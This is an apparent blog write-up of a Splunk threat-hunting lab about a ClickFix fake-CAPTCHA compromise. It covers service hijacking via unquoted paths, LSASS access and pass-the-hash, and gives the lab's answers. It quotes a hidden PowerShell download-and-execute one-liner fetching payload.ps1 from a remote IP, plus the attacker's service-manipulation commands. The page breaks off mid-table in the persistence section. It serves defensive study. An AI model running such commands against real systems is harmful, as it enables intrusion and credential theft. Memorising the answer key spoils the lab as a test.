@@ -1,0 +1,631 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>ClickFix / VodkaStealer — Endpoint Hunt & Service Hijacking — cuddest</title>
+<meta name="description" content="ClickFix / VodkaStealer — Endpoint Hunt & Service Hijacking">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Geist:wght@300;400;500;600&family=JetBrains+Mono:wght@400;500;600;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../css/style.css">
+<link rel="stylesheet" href="../css/writeups.css">
+</head>
+<body>
+
+<header class="topbar">
+  <div class="topbar-in">
+    <a class="logo" href="../index.html#writing" aria-label="cuddest — back to writeups">
+      <svg class="logo-mark" viewBox="0 0 24 24" aria-hidden="true">
+        <rect x="1.6" y="1.6" width="20.8" height="20.8" rx="2"
+              fill="none" stroke="currentColor" stroke-width="1.5"/>
+        <path d="M15.6 8.9a4.2 4.2 0 1 0 0 6.2" fill="none"
+              stroke="var(--logo-accent)" stroke-width="1.9" stroke-linecap="round"/>
+      </svg>
+      <span class="logo-word">uddest</span>
+    </a>
+    <span class="topbar-cta"><a class="ulink" href="../index.html#writing">← All writeups</a></span>
+  </div>
+</header>
+
+<article class="wpost">
+  <header class="wpost-head">
+    <p class="wpost-meta"><span>2026-08-13</span><span>25 min read</span></p>
+    <h1>ClickFix / VodkaStealer — Endpoint Hunt & Service Hijacking</h1>
+  </header>
+  <div class="wpost-body">
+<h2>Summary</h2>
+<p>The investigation started with a suspected browser/CAPTCHA-based compromise and evolved into an endpoint-centric hunt using Windows Security and Sysmon telemetry. The strongest evidence ultimately showed a malicious PowerShell payload execution on PAYOPS-WS-04 under NEXTGEN\n.hesham, followed by targeted service discovery of DataSyncPro, manipulation of the DataSync Pro directory, execution of a malicious Sync.exe as SYSTEM, suspicious LSASS access from rundll32.exe, and a SYSTEM-level PowerShell reverse shell to 165.245.213.184:4444. The attacker then performed domain reconnaissance and established multiple forms of scheduled-task persistence.</p>
+<p>Key conclusion: The malicious executable identified in the service-hijacking question was Sync.exe. The strongest C2 evidence is the SYSTEM PowerShell reverse shell to 165.245.213.184:4444.</p>
+<h2>Establishing the Splunk Environment</h2>
+<p>The first objective was to understand the data before attempting to hunt the attacker, which took me quite a good amount of time lol, that i had to take a break twice from the headache.</p>
+<p><strong>First, i started by Identifying the relevant index</strong></p>
+<p><code>index=*| stats count by index</code></p>
+<p>The main investigation dataset was index=main.</p>
+<p><strong>Next, i went to Identify available sourcetypes</strong></p>
+<p><code>index=main| stats count by sourcetype| sort - count</code></p>
+<p>The dataset was overwhelmingly Windows telemetry. The dominant sourcetype was xmlwineventlog with more than 6.4 million events.</p>
+<p><strong>Then, i passed to Identify the important log sources</strong></p>
+<p><code>index=main| stats count by source| sort - count</code></p>
+<p>The major sources included Windows Security, Sysmon, PowerShell, Windows Firewall, RDP and other operational channels. Sysmon was particularly valuable because it provided process, network, process-access and DNS telemetry, which is quite the starting point we are at right now, just few infos that our user got attacked by a <strong>captcha</strong></p>
+<p><strong>After that, i went to dig in a little more with sysmon and see which  Event IDs existed</strong></p>
+<p><code>index=main source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational"| stats count by EventCode| sort - count</code></p>
+<p>i summarized the results in the table under:</p>
+<table>
+<thead>
+<tr>
+<th>Event ID</th>
+<th>Meaning</th>
+<th>Why it mattered</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td>Process creation</td>
+<td>Trace execution, parent/child relationships and command lines</td>
+</tr>
+<tr>
+<td>3</td>
+<td>Network connection</td>
+<td>Identify outbound connections and candidate C2</td>
+</tr>
+<tr>
+<td>10</td>
+<td>Process access<br></td>
+<td>Investigate access to sensitive processes such as LSASS</td>
+</tr>
+<tr>
+<td>11</td>
+<td>File creation</td>
+<td>Look for payloads or dropped files<br></td>
+</tr>
+<tr>
+<td>13</td>
+<td>Registry value modification<br></td>
+<td>Potential service or persistence changes<br></td>
+</tr>
+<tr>
+<td>22</td>
+<td>DNS query</td>
+<td>Reconstruct browser and process-to-domain activity</td>
+</tr>
+</tbody>
+</table>
+<p><strong>So until now with these Early Hunting Attempts, we still quite got .... nothing</strong></p>
+<p>So i tried now to find my first thread and stop drowning in millions of records, Literal CAPTCHA searches were not productive, searching for the string "captcha" or "ClickFix" was not sufficient. <br />
+i tried to go broader with words like "robot", i found something that ended up to be a false lead</p>
+<p>index=main ("robot" OR "human")</p>
+<p>This returned Windows Security Event ID 4688 process-creation events involving SearchProtocolHost.exe and the user-agent string "MS Search 4.0 Robot". Investigation of the parent process showed SearchIndexer.exe, confirming this was Windows Search activity rather than the malicious CAPTCHA</p>
+<p>Also, searching all PowerShell was too noisy, for example:</p>
+<p><code>index=main source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=1(host="PAYOPS-WS-04" OR host="BCHAIN-WS-11")Image="*powershell.exe"</code></p>
+<p>Produced 1,368 events. The problem was not the data; it was the breadth of the query.</p>
+<p><strong>UNTIL....</strong> </p>
+<p>Parent-process narrowing produced the breakthrough</p>
+<p><code>index=main source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=1(host="PAYOPS-WS-04" OR host="BCHAIN-WS-11")Image="*powershell.exe"ParentImage="*explorer.exe"| table _time host User ParentImage Image CommandLine ProcessId| sort _time</code></p>
+<p>first, if youre wondering from where i got the hostnames, it was mainly from the wasted time wandering around those huge records.</p>
+<p>This query reduced the set to 18 events, the filter i used proved to work, narrowing down to only powershell commands since the technique consiste of copying and pasting the payload by the user in powershell, with just <strong>1</strong> event code event ( creation ) using the hosts i found, and i finally exposed the malicious hidden PowerShell download/execute command.</p>
+<p><code>"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://3.122.229.6/payload.ps1')"</code></p>
+<p>which came with the answer of the first 2 questions, as an extra.</p>
+<ol>
+<li><strong>The user visited a legitimate website that had been compromised with a ClickFix CAPTCHA overlay. What is the IP address of this website?</strong></li>
+</ol>
+<div class="answer">**: 3.122.229.6</div>
+
+<ol start="2">
+<li><strong>After interacting with the fake CAPTCHA, a PowerShell command was copied to the user's clipboard and executed via the Run dialog. What is the name of the payload file this command downloads?</strong></li>
+</ol>
+<div class="answer">**: payload.ps1</div>
+
+<h2>Now to after the Initial Payload Execution</h2>
+<p>Now since things are starting to get clearer, a tight timeline we got ourselves an initial paylaod, a powershell script and the ip from where it was downloaded, the first thing i would think of now is: what is the script doing?</p>
+<p>And my first guess was exactly the question the lab asked next: <strong>what C2 is it conecting to?</strong><br />
+so i started tightening up my search to the exact time after the payload was executed, trying to find the ips our host contacted in that period of time and rank it by count:</p>
+<p><code>index=main source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=3</code><br />
+<code>host="PAYOPS-WS-04"</code><br />
+<code>| where _time &gt;= strptime("2026-04-20 23:20:00","%Y-%m-%d %H:%M:%S")</code><br />
+<code>AND _time &lt;= strptime("2026-04-21 00:10:00","%Y-%m-%d %H:%M:%S")</code><br />
+<code>| stats count by DestinationIp</code><br />
+<code>| sort - count</code></p>
+<p>and the result were very helpful.<br />
+the top 3 results contained two private addresses, and our answer.</p>
+<table>
+<thead>
+<tr>
+<th>IP</th>
+<th>COUNT</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>169.254.169.254</td>
+<td>1130</td>
+</tr>
+<tr>
+<td>100.52.249.75</td>
+<td>826</td>
+</tr>
+<tr>
+<td>10.10.6.89</td>
+<td>74</td>
+</tr>
+</tbody>
+</table>
+<ol start="3">
+<li><strong>The initial payload established a command-and-control channel. What is the IP address of the C2 server?</strong></li>
+</ol>
+<div class="answer">** 100.52.249.75</div>
+
+<h2>Attacker service enumeration</h2>
+<p>the lab asks us next to look for any enum movement that the attacker could have done:</p>
+<p><code>index=main source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=1</code><br />
+<code>host="PAYOPS-WS-04"</code><br />
+<code>| where _time &gt;= strptime("2026-04-20 23:20:00","%Y-%m-%d %H:%M:%S")</code><br />
+<code>AND _time &lt;= strptime("2026-04-21 00:10:00","%Y-%m-%d %H:%M:%S")</code><br />
+<code>| search CommandLine="*Get-Service*"</code><br />
+<code>OR CommandLine="*Win32_Service*"</code><br />
+<code>OR CommandLine="*sc.exe*"</code><br />
+<code>OR CommandLine="*sc query*"</code><br />
+<code>OR CommandLine="*wmic*service*"</code><br />
+<code>OR CommandLine="*net start*"</code><br />
+<code>| table _time host User ParentImage Image CommandLine ProcessId</code><br />
+<code>| sort _time</code></p>
+<p>so as always, i tightened the time window and looked for the most commandlines that he might have searched for</p>
+<p>I ended up with 20 events, one catched my eyes:</p>
+<p><code>wmic service get name,pathname,startmode</code></p>
+<p>This is the first observed service-enumeration command, with repeated executions at <strong>23:33:42</strong> and <strong>23:57:39</strong>.<br />
+The rest was all noise ran mainly by higher privelege processes.</p>
+<ol start="4">
+<li><strong>To find a privilege escalation vector, the attacker enumerated all Windows services and their properties. What is the WMI command used to retrieve service names, executable paths, and start modes?</strong></li>
+</ol>
+<div class="answer">**: <code>wmic service get name,pathname,startmode</code></div>
+
+<p>The command specifically requested service name, executable path and startup mode, then filtered for DataSync. This is exactly the metadata useful for evaluating service-path weaknesses.</p>
+<h2>DataSyncPro setup observed earlier</h2>
+<p>A <strong>unquoted service path vulnerability</strong> is a Windows privilege-escalation issue that happens when a Windows service's executable path contains <strong>spaces but isn't enclosed in quotes</strong>. <br />
+<strong>Simple example</strong>:<br />
+Suppose a service is configured to run:</p>
+<pre><code>C:\Program Files\My App\service.exe
+</code></pre>
+<p>Because the path isn't quoted, Windows can interpret the spaces ambiguously.</p>
+<p>Windows may try possible executable paths such as:</p>
+<pre><code>C:\Program.exe
+C:\Program Files\My.exe
+C:\Program Files\My App\service.exe
+</code></pre>
+<p>If an attacker can write to one of the earlier locations they could potentially place a malicious executable there, which could turn into a privelage escalation if these locations run as NT AUTHORITY\SYSTEM for example.</p>
+<p>I wanted to dive more into DataSync service:</p>
+<p><code>index=main source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational"</code><br />
+<code>host="PAYOPS-WS-04"</code><br />
+<code>| search CommandLine="*DataSync*"</code><br />
+<code>| table _time User ParentImage Image CommandLine</code><br />
+<code>| sort _time</code></p>
+<p>and the results were intrensting:<br />
+The key sequence is:</p>
+<ul>
+<li>
+<p><strong>23:33:18 / 23:33:42</strong> — <code>n.hesham</code> enumerates services:</p>
+</li>
+<li>
+<p><code>wmic service get name,pathname,startmode | findstr /i "DataSync"</code></p>
+<p>This is specifically looking for the <code>DataSync</code> service and its <strong>binary path</strong>.</p>
+</li>
+<li>
+<p><strong>23:36:53</strong> — stops the service:</p>
+</li>
+<li>
+<p><code>sc stop DataSyncPro</code></p>
+</li>
+<li>
+<p><strong>23:40:18</strong> — suspicious file manipulation:</p>
+</li>
+<li>
+<p><code>move "C:\Program Files\DataSync Pro\Service.exe" "C:\Program Files\DataSync Pro\Sync.exe"</code></p>
+</li>
+</ul>
+<p>And earlier, the service was created with:</p>
+<pre><code>sc.exe create DataSyncPro binPath= &quot;C:\Program Files\DataSync Pro\Sync Service\datasync-svc.exe&quot; start= auto
+</code></pre>
+<p>DataSync service source compiled into C:\Program Files\DataSync Pro\Sync Service\datasync-svc.exe<br />
+sc.exe create DataSyncPro binPath= "C:\Program Files\DataSync Pro\Sync Service\datasync-svc.exe" start= auto DisplayName= "DataSync Pro Synchronization Service"</p>
+<p>We can safely identifiy <strong>DataSyncPro</strong> as the targeted service by following the attacker’s service-enumeration activity and correlating it with the service’s configuration. At <strong>23:33:18</strong> and <strong>23:33:42 on April 20, 2026</strong>, <code>NEXTGEN\n.hesham</code> executed <code>wmic service get name,pathname,startmode | findstr /i "DataSync"</code>, showing that the attacker was specifically looking for a service containing “DataSync.” Searching the dataset for <code>DataSync</code> revealed the <code>DataSyncPro</code> service, which had been configured earlier that day to run <code>C:\Program Files\DataSync Pro\Sync Service\datasync-svc.exe</code>, while the directory had been granted <strong>Modify</strong> permissions to the local <code>Users</code> group. The attacker subsequently stopped <code>DataSyncPro</code> at <strong>23:36:53</strong> and, at <strong>23:40:18</strong>, moved <code>Service.exe</code> to <code>Sync.exe</code> inside the DataSync directory. Finally, at <strong>00:14:25 on April 21</strong>, <code>Sync.exe</code> was observed as the parent of <code>rundll32.exe</code> running as <code>NT AUTHORITY\SYSTEM</code>, providing the strongest correlation that <strong>DataSyncPro was the service whose execution flow was hijacked</strong>, with <strong>Sync.exe</strong> being the malicious executable used in the attack.</p>
+<ol start="5">
+<li><strong>The attacker exploited an unquoted service path vulnerability. What is the name of the service they exploited?</strong></li>
+</ol>
+<div class="answer">**: DataSyncPro</div>
+
+<ol start="6">
+<li><strong>To hijack the service execution flow, the attacker placed a malicious binary in a specific directory. What is the name of this malicious executable?</strong></li>
+</ol>
+<div class="answer">**: Sync.exe</div>
+
+<ol start="7">
+<li><strong>After successfully escalating privileges, a new process began beaconing to the C2 server as SYSTEM. What is the name of this process?</strong></li>
+</ol>
+<div class="answer">**: rundll32.exe</div>
+
+<h3>LSASS Access</h3>
+<p>I used Sysmon Event ID 10  to investigate access to lsass.exe.</p>
+<p><code>index=* EventCode=10 TargetImage="*\lsass.exe"| table _time User SourceImage SourceProcessId TargetImage TargetProcessId GrantedAccess CallTrace| sort _time</code></p>
+<p>The result was  repeated access to the Lsass.exe process, the vital core Windows system process. It handles user logins, checks passwords, manages security tokens ...</p>
+<table>
+<thead>
+<tr>
+<th><a href="https://d45eae01-c68d-4854-be01-de74ab8ce604.cyberdefenders.network/en-US/app/search/search?q=search%20index%3D*%20EventCode%3D10%20TargetImage%3D%22*%5C%5Clsass.exe%22%0A%7C%20table%20_time%20User%20SourceImage%20SourceProcessId%20TargetImage%20TargetProcessId%20GrantedAccess%20CallTrace%0A%7C%20sort%20_time&amp;display.page.search.mode=verbose&amp;dispatch.sample_ratio=1&amp;workload_pool=&amp;earliest=0&amp;latest=now&amp;display.page.search.tab=statistics&amp;display.general.type=statistics&amp;display.prefs.statistics.offset=40&amp;sid=1786647425.24#">_time</a></th>
+<th><a href="https://d45eae01-c68d-4854-be01-de74ab8ce604.cyberdefenders.network/en-US/app/search/search?q=search%20index%3D*%20EventCode%3D10%20TargetImage%3D%22*%5C%5Clsass.exe%22%0A%7C%20table%20_time%20User%20SourceImage%20SourceProcessId%20TargetImage%20TargetProcessId%20GrantedAccess%20CallTrace%0A%7C%20sort%20_time&amp;display.page.search.mode=verbose&amp;dispatch.sample_ratio=1&amp;workload_pool=&amp;earliest=0&amp;latest=now&amp;display.page.search.tab=statistics&amp;display.general.type=statistics&amp;display.prefs.statistics.offset=40&amp;sid=1786647425.24#"></a><a href="https://d45eae01-c68d-4854-be01-de74ab8ce604.cyberdefenders.network/en-US/app/search/search?q=search%20index%3D*%20EventCode%3D10%20TargetImage%3D%22*%5C%5Clsass.exe%22%0A%7C%20table%20_time%20User%20SourceImage%20SourceProcessId%20TargetImage%20TargetProcessId%20GrantedAccess%20CallTrace%0A%7C%20sort%20_time&amp;display.page.search.mode=verbose&amp;dispatch.sample_ratio=1&amp;workload_pool=&amp;earliest=0&amp;latest=now&amp;display.page.search.tab=statistics&amp;display.general.type=statistics&amp;display.prefs.statistics.offset=40&amp;sid=1786647425.24#">User</a></th>
+<th><a href="https://d45eae01-c68d-4854-be01-de74ab8ce604.cyberdefenders.network/en-US/app/search/search?q=search%20index%3D*%20EventCode%3D10%20TargetImage%3D%22*%5C%5Clsass.exe%22%0A%7C%20table%20_time%20User%20SourceImage%20SourceProcessId%20TargetImage%20TargetProcessId%20GrantedAccess%20CallTrace%0A%7C%20sort%20_time&amp;display.page.search.mode=verbose&amp;dispatch.sample_ratio=1&amp;workload_pool=&amp;earliest=0&amp;latest=now&amp;display.page.search.tab=statistics&amp;display.general.type=statistics&amp;display.prefs.statistics.offset=40&amp;sid=1786647425.24#"></a><a href="https://d45eae01-c68d-4854-be01-de74ab8ce604.cyberdefenders.network/en-US/app/search/search?q=search%20index%3D*%20EventCode%3D10%20TargetImage%3D%22*%5C%5Clsass.exe%22%0A%7C%20table%20_time%20User%20SourceImage%20SourceProcessId%20TargetImage%20TargetProcessId%20GrantedAccess%20CallTrace%0A%7C%20sort%20_time&amp;display.page.search.mode=verbose&amp;dispatch.sample_ratio=1&amp;workload_pool=&amp;earliest=0&amp;latest=now&amp;display.page.search.tab=statistics&amp;display.general.type=statistics&amp;display.prefs.statistics.offset=40&amp;sid=1786647425.24#">SourceImage</a></th>
+<th><a href="https://d45eae01-c68d-4854-be01-de74ab8ce604.cyberdefenders.network/en-US/app/search/search?q=search%20index%3D*%20EventCode%3D10%20TargetImage%3D%22*%5C%5Clsass.exe%22%0A%7C%20table%20_time%20User%20SourceImage%20SourceProcessId%20TargetImage%20TargetProcessId%20GrantedAccess%20CallTrace%0A%7C%20sort%20_time&amp;display.page.search.mode=verbose&amp;dispatch.sample_ratio=1&amp;workload_pool=&amp;earliest=0&amp;latest=now&amp;display.page.search.tab=statistics&amp;display.general.type=statistics&amp;display.prefs.statistics.offset=40&amp;sid=1786647425.24#"></a><a href="https://d45eae01-c68d-4854-be01-de74ab8ce604.cyberdefenders.network/en-US/app/search/search?q=search%20index%3D*%20EventCode%3D10%20TargetImage%3D%22*%5C%5Clsass.exe%22%0A%7C%20table%20_time%20User%20SourceImage%20SourceProcessId%20TargetImage%20TargetProcessId%20GrantedAccess%20CallTrace%0A%7C%20sort%20_time&amp;display.page.search.mode=verbose&amp;dispatch.sample_ratio=1&amp;workload_pool=&amp;earliest=0&amp;latest=now&amp;display.page.search.tab=statistics&amp;display.general.type=statistics&amp;display.prefs.statistics.offset=40&amp;sid=1786647425.24#">SourceProcessId</a></th>
+<th><a href="https://d45eae01-c68d-4854-be01-de74ab8ce604.cyberdefenders.network/en-US/app/search/search?q=search%20index%3D*%20EventCode%3D10%20TargetImage%3D%22*%5C%5Clsass.exe%22%0A%7C%20table%20_time%20User%20SourceImage%20SourceProcessId%20TargetImage%20TargetProcessId%20GrantedAccess%20CallTrace%0A%7C%20sort%20_time&amp;display.page.search.mode=verbose&amp;dispatch.sample_ratio=1&amp;workload_pool=&amp;earliest=0&amp;latest=now&amp;display.page.search.tab=statistics&amp;display.general.type=statistics&amp;display.prefs.statistics.offset=40&amp;sid=1786647425.24#"></a><a href="https://d45eae01-c68d-4854-be01-de74ab8ce604.cyberdefenders.network/en-US/app/search/search?q=search%20index%3D*%20EventCode%3D10%20TargetImage%3D%22*%5C%5Clsass.exe%22%0A%7C%20table%20_time%20User%20SourceImage%20SourceProcessId%20TargetImage%20TargetProcessId%20GrantedAccess%20CallTrace%0A%7C%20sort%20_time&amp;display.page.search.mode=verbose&amp;dispatch.sample_ratio=1&amp;workload_pool=&amp;earliest=0&amp;latest=now&amp;display.page.search.tab=statistics&amp;display.general.type=statistics&amp;display.prefs.statistics.offset=40&amp;sid=1786647425.24#">TargetImage</a></th>
+<th><a href="https://d45eae01-c68d-4854-be01-de74ab8ce604.cyberdefenders.network/en-US/app/search/search?q=search%20index%3D*%20EventCode%3D10%20TargetImage%3D%22*%5C%5Clsass.exe%22%0A%7C%20table%20_time%20User%20SourceImage%20SourceProcessId%20TargetImage%20TargetProcessId%20GrantedAccess%20CallTrace%0A%7C%20sort%20_time&amp;display.page.search.mode=verbose&amp;dispatch.sample_ratio=1&amp;workload_pool=&amp;earliest=0&amp;latest=now&amp;display.page.search.tab=statistics&amp;display.general.type=statistics&amp;display.prefs.statistics.offset=40&amp;sid=1786647425.24#"></a><a href="https://d45eae01-c68d-4854-be01-de74ab8ce604.cyberdefenders.network/en-US/app/search/search?q=search%20index%3D*%20EventCode%3D10%20TargetImage%3D%22*%5C%5Clsass.exe%22%0A%7C%20table%20_time%20User%20SourceImage%20SourceProcessId%20TargetImage%20TargetProcessId%20GrantedAccess%20CallTrace%0A%7C%20sort%20_time&amp;display.page.search.mode=verbose&amp;dispatch.sample_ratio=1&amp;workload_pool=&amp;earliest=0&amp;latest=now&amp;display.page.search.tab=statistics&amp;display.general.type=statistics&amp;display.prefs.statistics.offset=40&amp;sid=1786647425.24#">TargetProcessId</a></th>
+<th><a href="https://d45eae01-c68d-4854-be01-de74ab8ce604.cyberdefenders.network/en-US/app/search/search?q=search%20index%3D*%20EventCode%3D10%20TargetImage%3D%22*%5C%5Clsass.exe%22%0A%7C%20table%20_time%20User%20SourceImage%20SourceProcessId%20TargetImage%20TargetProcessId%20GrantedAccess%20CallTrace%0A%7C%20sort%20_time&amp;display.page.search.mode=verbose&amp;dispatch.sample_ratio=1&amp;workload_pool=&amp;earliest=0&amp;latest=now&amp;display.page.search.tab=statistics&amp;display.general.type=statistics&amp;display.prefs.statistics.offset=40&amp;sid=1786647425.24#"></a><a href="https://d45eae01-c68d-4854-be01-de74ab8ce604.cyberdefenders.network/en-US/app/search/search?q=search%20index%3D*%20EventCode%3D10%20TargetImage%3D%22*%5C%5Clsass.exe%22%0A%7C%20table%20_time%20User%20SourceImage%20SourceProcessId%20TargetImage%20TargetProcessId%20GrantedAccess%20CallTrace%0A%7C%20sort%20_time&amp;display.page.search.mode=verbose&amp;dispatch.sample_ratio=1&amp;workload_pool=&amp;earliest=0&amp;latest=now&amp;display.page.search.tab=statistics&amp;display.general.type=statistics&amp;display.prefs.statistics.offset=40&amp;sid=1786647425.24#">GrantedAccess</a></th>
+<th><a href="https://d45eae01-c68d-4854-be01-de74ab8ce604.cyberdefenders.network/en-US/app/search/search?q=search%20index%3D*%20EventCode%3D10%20TargetImage%3D%22*%5C%5Clsass.exe%22%0A%7C%20table%20_time%20User%20SourceImage%20SourceProcessId%20TargetImage%20TargetProcessId%20GrantedAccess%20CallTrace%0A%7C%20sort%20_time&amp;display.page.search.mode=verbose&amp;dispatch.sample_ratio=1&amp;workload_pool=&amp;earliest=0&amp;latest=now&amp;display.page.search.tab=statistics&amp;display.general.type=statistics&amp;display.prefs.statistics.offset=40&amp;sid=1786647425.24#"></a><a href="https://d45eae01-c68d-4854-be01-de74ab8ce604.cyberdefenders.network/en-US/app/search/search?q=search%20index%3D*%20EventCode%3D10%20TargetImage%3D%22*%5C%5Clsass.exe%22%0A%7C%20table%20_time%20User%20SourceImage%20SourceProcessId%20TargetImage%20TargetProcessId%20GrantedAccess%20CallTrace%0A%7C%20sort%20_time&amp;display.page.search.mode=verbose&amp;dispatch.sample_ratio=1&amp;workload_pool=&amp;earliest=0&amp;latest=now&amp;display.page.search.tab=statistics&amp;display.general.type=statistics&amp;display.prefs.statistics.offset=40&amp;sid=1786647425.24#">CallTrace</a></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>2026-04-21 00:16:52</td>
+<td></td>
+<td>C:\Windows\system32\rundll32.exe</td>
+<td>5328</td>
+<td>C:\Windows\system32\lsass.exe</td>
+<td>676</td>
+<td>0x1fffff</td>
+<td>C:\Windows\SYSTEM32\ntdll.dll+9d4a4|C:\Windows\System32\KERNELBASE.dll+2e55e|UNKNOWN(0000013842E91D3D)</td>
+</tr>
+<tr>
+<td>2026-04-21 00:17:20</td>
+<td></td>
+<td>C:\Windows\system32\rundll32.exe</td>
+<td>6008</td>
+<td>C:\Windows\system32\lsass.exe</td>
+<td>676</td>
+<td>0x1010</td>
+<td>C:\Windows\SYSTEM32\ntdll.dll+9d4a4|C:\Windows\System32\KERNELBASE.dll+2e55e|UNKNOWN(000001AA65C9D97C)</td>
+</tr>
+<tr>
+<td>2026-04-21 00:22:17</td>
+<td></td>
+<td>C:\Windows\system32\rundll32.exe</td>
+<td>9472</td>
+<td>C:\Windows\system32\lsass.exe</td>
+<td>676</td>
+<td>0x1010</td>
+<td>C:\Windows\SYSTEM32\ntdll.dll+9d4a4|C:\Windows\System32\KERNELBASE.dll+2e55e|UNKNOWN(000002110636D97C)</td>
+</tr>
+</tbody>
+</table>
+<p>These were the first entries, so we can easily answer our question, the data supports describing these as suspicious LSASS process-access events. It does not, by itself, prove exactly which credentials were extracted.</p>
+<ol start="8">
+<li><strong>At what time did the attacker first obtain full access to LSASS for credential dumping?</strong></li>
+</ol>
+<div class="answer">**: 2026-04-21 00:16:52</div>
+
+<h2>Who did they log in as?</h2>
+<p>started with:</p>
+<p><code>index=* EventCode=4624 earliest="04/21/2026:00:16:52" latest="04/21/2026:02:00:00"</code><br />
+<code>| table _time Account_Name Account_Domain Logon_Type Logon_ID Source_Network_Address</code><br />
+<code>| sort _time</code></p>
+<p>trying to find logon events, the results did not really help, around 100 return with Every single field empty. <code>Logon_ID = 0x0</code> on every row, until i realized i was usng the wronf FieldNames.</p>
+<p>This dataset is winlogbeat/XmlWinEventLog, so the fields are the raw Windows names, not the Splunk-friendly aliases:</p>
+<p><code>index=* EventCode=4624 earliest="04/21/2026:00:16:00" latest="04/21/2026:01:30:00"</code><br />
+<code>| table _time TargetUserName TargetDomainName LogonType TargetLogonId IpAddress WorkstationName LogonProcessName AuthenticationPackageName</code><br />
+<code>| sort _time</code></p>
+<p>Ended up with 297 Events ! a lot of noise ofc but after some filtering two suspected human accounts were appearing: </p>
+<p>00:20:11   k.mostafa.admin   NEXTGEN.LOCAL   Type 3    Kerberos   10.10.11.252<br />
+00:25:21   n.hesham         NEXTGEN.LOCAL          Type 3    Kerberos   10.10.11.252<br />
+00:27:37   SYSTEM            NT AUTHORITY               Type 9    seclogo    ::1<br />
+00:30:45   k.mostafa.admin   NEXTGEN                  Type 3   NtLmSsp/NTLM   10.10.11.252   </p>
+<p>One thing jumped out:</p>
+<p><strong>The NTLM pair at 00:30:45.</strong> Everything else in this environment is Kerberos. Two NTLM logons for an admin account.</p>
+<p>so to make things clear, when youre in a see of kerberos and you catch an NTLM logon, you gotta directly suspect a pass-the-hash movement !from workstation <code>PAYOPS-WS-04</code>, in a sea of Kerberos, is textbook pass-the-hash / relay. This one timestamp turned out to be the hinge of the whole lateral movement phase.</p>
+<p><strong><code>k.mostafa.admin</code> is an admin-named account</strong> that the attacker did not start with. So: <code>n.hesham</code> (initial user) → LSASS dump → <code>k.mostafa.admin</code>, which answers our question.</p>
+<ol start="9">
+<li><strong>After harvesting credentials, the attacker used a stolen account for pass-the-hash lateral movement. What was the username of that account?</strong></li>
+</ol>
+<div class="answer">**: k.mostafa.admin</div>
+
+<h2>Moving laterally..</h2>
+<p>At this point the machines number is growing, so i need a sanity check:<br />
+Before I could talk about lateral movement I needed to know which IP was which box. Pulled from the machine-account rows:</p>
+<table>
+<thead>
+<tr>
+<th>Host</th>
+<th>IP</th>
+<th>Role</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>PAYOPS-WS-04</td>
+<td><code>10.10.11.252</code></td>
+<td>Attacker foothold, first workstation</td>
+</tr>
+<tr>
+<td>COMP-FS-01</td>
+<td><code>10.10.11.81</code></td>
+<td>Lateral target</td>
+</tr>
+<tr>
+<td>BCHAIN-WS-11</td>
+<td><code>10.10.11.206</code></td>
+<td>Second workstation</td>
+</tr>
+<tr>
+<td>then went to query:</td>
+<td></td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<p><code>index=* EventCode=4624 TargetUserName="k.mostafa.admin"</code><br />
+<code>earliest="04/21/2026:00:30:00" latest="04/21/2026:01:30:00"</code><br />
+<code>| eval dest=coalesce(host, ComputerName)</code><br />
+<code>| stats min(_time) as first max(_time) as last count</code><br />
+<code>values(LogonType) as types</code><br />
+<code>values(AuthenticationPackageName) as auth</code><br />
+<code>values(IpAddress) as src_ips by dest</code><br />
+<code>| sort first</code></p>
+<table>
+<thead>
+<tr>
+<th>dest</th>
+<th>first</th>
+<th>count</th>
+<th>types</th>
+<th>auth</th>
+<th>src_ips</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>DC01</td>
+<td>00:30:27</td>
+<td>24</td>
+<td>3</td>
+<td>Kerberos</td>
+<td>10.10.11.206, 10.10.11.252</td>
+</tr>
+<tr>
+<td>COMP-FS-01</td>
+<td>00:30:45</td>
+<td>2</td>
+<td>3</td>
+<td><strong>NTLM</strong></td>
+<td>10.10.11.252</td>
+</tr>
+</tbody>
+</table>
+<p>COMP-FS-01 was a big suspect since the lab is asking about a fileserver, and teh notation FS is for fileservers... duh</p>
+<p>from old queries i made a had the address for that machine saved for times like these..</p>
+<ol start="10">
+<li><strong>The attacker used the compromised domain admin's credentials to move laterally to a file server. What is the IP address of this server?</strong></li>
+</ol>
+<div class="answer">** :  10.10.11.81</div>
+
+<h2>The atackers Persistence plan</h2>
+<p>index=* EventCode=4698 earliest="04/20/2026:23:00:00" latest="04/21/2026:03:00:00"<br />
+| eval dest=coalesce(host, ComputerName)<br />
+| table _time dest TaskName SubjectUserName<br />
+| sort _time</p>
+<p>here i went dierctly to find any sheduled tasks made searching by eventcode.<br />
+Ended up with 5 events, one task name, three machines:</p>
+<table>
+<thead>
+<tr>
+<th>Time</th>
+<th>Host</th>
+<th>Created by</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>00:50:20</td>
+<td><strong>COMP-FS-01</strong></td>
+<td><code>COMP-FS-01$</code> (SYSTEM)</td>
+</tr>
+<tr>
+<td>00:53:06</td>
+<td>PAYOPS-WS-04</td>
+<td>SYSTEM</td>
+</tr>
+<tr>
+<td>01:03:34</td>
+<td>PAYOPS-WS-04</td>
+<td>SYSTEM</td>
+</tr>
+<tr>
+<td>01:20:32</td>
+<td>PAYOPS-WS-04</td>
+<td>SYSTEM</td>
+</tr>
+<tr>
+<td>01:50:19</td>
+<td><strong>BCHAIN-WS-11</strong></td>
